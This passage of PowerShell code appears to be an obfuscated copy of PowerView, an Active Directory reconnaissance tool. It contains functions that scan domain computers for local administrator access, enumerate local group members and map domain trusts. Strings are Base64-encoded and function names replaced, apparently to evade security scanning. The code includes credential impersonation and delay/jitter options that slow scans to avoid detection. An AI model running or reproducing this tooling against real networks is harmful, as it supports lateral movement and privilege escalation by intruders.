                icm -ScriptBlock ${87} -ArgumentList ${89}, $Include, $ExcludedShares, $OfficeDocs, ${f7}, $FreshEXEs, ${f6}, ${85}
            }
        }
        else {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ASQBuAHQAZQByAGUAcwB0AGkAbgBnAEQAbwBtAGEAaQBuAFMAaABhAHIAZQBGAGkAbABlAF0AIABVAHMAaQBuAGcAIAB0AGgAcgBlAGEAZABpAG4AZwAgAHcAaQB0AGgAIAB0AGgAcgBlAGEAZABzADoAIAAkAFQAaAByAGUAYQBkAHMA')))
            ${86} = @{
                'Include' = $Include
                'ExcludedShares' = $ExcludedShares
                'OfficeDocs' = $OfficeDocs
                'ExcludeHidden' = ${f7}
                'FreshEXEs' = $FreshEXEs
                'CheckWriteAccess' = ${f6}
                'TokenHandle' = ${85}
            }
            f76 -94 ${88} -f12 ${87} -f11 ${86} -Threads $Threads
        }
    }
    END {
        if (${85}) {
            f75 -f2 ${85}
        }
    }
}
function Find-LocalAdminAccess {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        ${94},
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,
        [Switch]
        $CheckShareAccess,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,
        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )
    BEGIN {
        ${96} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEwARABBAFAARgBpAGwAdABlAHIA')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $ComputerLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQBhAHIAYwBoAEIAYQBzAGUA')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $ComputerSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))] = ${f5} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAA==')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))] = ${f4} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQByAHYAaQBjAGUAUABhAGMAawA=')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))] = ${f3} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAaQB0AGUATgBhAG0AZQA=')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA==')))] = $SiteName }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            ${88} = ${94}
        }
        else {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ATABvAGMAYQBsAEEAZABtAGkAbgBBAGMAYwBlAHMAcwBdACAAUQB1AGUAcgB5AGkAbgBnACAAYwBvAG0AcAB1AHQAZQByAHMAIABpAG4AIAB0AGgAZQAgAGQAbwBtAGEAaQBuAA==')))
            ${88} = f79 @96 | select -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-LocalAdminAccess] TargetComputers length: $(${88}.Length)"
        if (${88}.Length -eq 0) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ATABvAGMAYQBsAEEAZABtAGkAbgBBAGMAYwBlAHMAcwBdACAATgBvACAAaABvAHMAdABzACAAZgBvAHUAbgBkACAAdABvACAAZQBuAHUAbQBlAHIAYQB0AGUA')))
        }
        ${87} = {
            Param(${94}, ${f2})
            if (${f2}) {
                $Null = f77 -f2 ${f2} -f39
            }
            ForEach (${89} in ${94}) {
                ${93} = Test-Connection -Count 1 -Quiet -ComputerName ${89}
                if (${93}) {
                    ${97} = f80 -94 ${89}
                    if (${97}.IsAdmin) {
                        ${89}
                    }
                }
            }
            if (${f2}) {
                f75
            }
        }
        ${85} = $Null
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
                ${85} = f77 -Credential $Credential
            }
            else {
                ${85} = f77 -Credential $Credential -f39
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
            Write-Verbose "[Find-LocalAdminAccess] Total number of hosts: $(${88}.count)"
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ATABvAGMAYQBsAEEAZABtAGkAbgBBAGMAYwBlAHMAcwBdACAARABlAGwAYQB5ADoAIAAkAEQAZQBsAGEAeQAsACAASgBpAHQAdABlAHIAOgAgACQASgBpAHQAdABlAHIA')))
            ${90} = 0
            ${91} = New-Object System.Random
            ForEach (${89} in ${88}) {
                ${90} = ${90} + 1
                sleep -Seconds ${91}.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-LocalAdminAccess] Enumerating server ${89} (${90} of $(${88}.count))"
                icm -ScriptBlock ${87} -ArgumentList ${89}, ${85}
            }
        }
        else {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ATABvAGMAYQBsAEEAZABtAGkAbgBBAGMAYwBlAHMAcwBdACAAVQBzAGkAbgBnACAAdABoAHIAZQBhAGQAaQBuAGcAIAB3AGkAdABoACAAdABoAHIAZQBhAGQAcwA6ACAAJABUAGgAcgBlAGEAZABzAA==')))
            ${86} = @{
                'TokenHandle' = ${85}
            }
            f76 -94 ${88} -f12 ${87} -f11 ${86} -Threads $Threads
        }
    }
}
function Find-DomainLocalGroupMember {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        ${94},
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${45} = 'Administrators',
        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $Method = 'API',
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,
        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )
    BEGIN {
        ${96} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEwARABBAFAARgBpAGwAdABlAHIA')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $ComputerLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQBhAHIAYwBoAEIAYQBzAGUA')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $ComputerSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))] = ${f5} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAA==')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))] = ${f4} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQByAHYAaQBjAGUAUABhAGMAawA=')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))] = ${f3} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAaQB0AGUATgBhAG0AZQA=')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA==')))] = $SiteName }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            ${88} = ${94}
        }
        else {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATABvAGMAYQBsAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAAUQB1AGUAcgB5AGkAbgBnACAAYwBvAG0AcAB1AHQAZQByAHMAIABpAG4AIAB0AGgAZQAgAGQAbwBtAGEAaQBuAA==')))
            ${88} = f79 @96 | select -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-DomainLocalGroupMember] TargetComputers length: $(${88}.Length)"
        if (${88}.Length -eq 0) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATABvAGMAYQBsAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAATgBvACAAaABvAHMAdABzACAAZgBvAHUAbgBkACAAdABvACAAZQBuAHUAbQBlAHIAYQB0AGUA')))
        }
        ${87} = {
            Param(${94}, ${45}, $Method, ${f2})
            if (${45} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBzAA==')))) {
                ${95} = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid,$null)
                ${45} = (${95}.Translate([System.Security.Principal.NTAccount]).Value -split "\\")[-1]
            }
            if (${f2}) {
                $Null = f77 -f2 ${f2} -f39
            }
            ForEach (${89} in ${94}) {
                ${93} = Test-Connection -Count 1 -Quiet -ComputerName ${89}
                if (${93}) {
                    ${92} = @{
                        'ComputerName' = ${89}
                        'Method' = $Method
                        'GroupName' = ${45}
                    }
                    f78 @92
                }
            }
            if (${f2}) {
                f75
            }
        }
        ${85} = $Null
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
                ${85} = f77 -Credential $Credential
            }
            else {
                ${85} = f77 -Credential $Credential -f39
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
            Write-Verbose "[Find-DomainLocalGroupMember] Total number of hosts: $(${88}.count)"
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATABvAGMAYQBsAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAARABlAGwAYQB5ADoAIAAkAEQAZQBsAGEAeQAsACAASgBpAHQAdABlAHIAOgAgACQASgBpAHQAdABlAHIA')))
            ${90} = 0
            ${91} = New-Object System.Random
            ForEach (${89} in ${88}) {
                ${90} = ${90} + 1
                sleep -Seconds ${91}.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-DomainLocalGroupMember] Enumerating server ${89} (${90} of $(${88}.count))"
                icm -ScriptBlock ${87} -ArgumentList ${89}, ${45}, $Method, ${85}
            }
        }
        else {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATABvAGMAYQBsAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAAVQBzAGkAbgBnACAAdABoAHIAZQBhAGQAaQBuAGcAIAB3AGkAdABoACAAdABoAHIAZQBhAGQAcwA6ACAAJABUAGgAcgBlAGEAZABzAA==')))
            ${86} = @{
                'GroupName' = ${45}
                'Method' = $Method
                'TokenHandle' = ${85}
            }
            f76 -94 ${88} -f12 ${87} -f11 ${86} -Threads $Threads
        }
    }
    END {
        if (${85}) {
            f75 -f2 ${85}
        }
    }
}
function f68 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,
        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${82} = @{
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMQA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAE4AXwBUAFIAQQBOAFMASQBUAEkAVgBFAA==')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMgA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBQAEwARQBWAEUATABfAE8ATgBMAFkA')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAANAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBJAEwAVABFAFIAXwBTAEkARABTAA==')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAOAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBPAFIARQBTAFQAXwBUAFIAQQBOAFMASQBUAEkAVgBFAA==')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADEAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBSAE8AUwBTAF8ATwBSAEcAQQBOAEkAWgBBAFQASQBPAE4A')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADIAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBJAFQASABJAE4AXwBGAE8AUgBFAFMAVAA=')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADQAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABSAEUAQQBUAF8AQQBTAF8ARQBYAFQARQBSAE4AQQBMAA==')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADgAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABSAFUAUwBUAF8AVQBTAEUAUwBfAFIAQwA0AF8ARQBOAEMAUgBZAFAAVABJAE8ATgA=')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAxADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABSAFUAUwBUAF8AVQBTAEUAUwBfAEEARQBTAF8ASwBFAFkAUwA=')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAyADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBSAE8AUwBTAF8ATwBSAEcAQQBOAEkAWgBBAFQASQBPAE4AXwBOAE8AXwBUAEcAVABfAEQARQBMAEUARwBBAFQASQBPAE4A')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAA0ADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABJAE0AXwBUAFIAVQBTAFQA')))
        }
        ${84} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${84}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${84}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${84}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${84}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${84}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${84}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${84}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${84}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${84}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${84}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
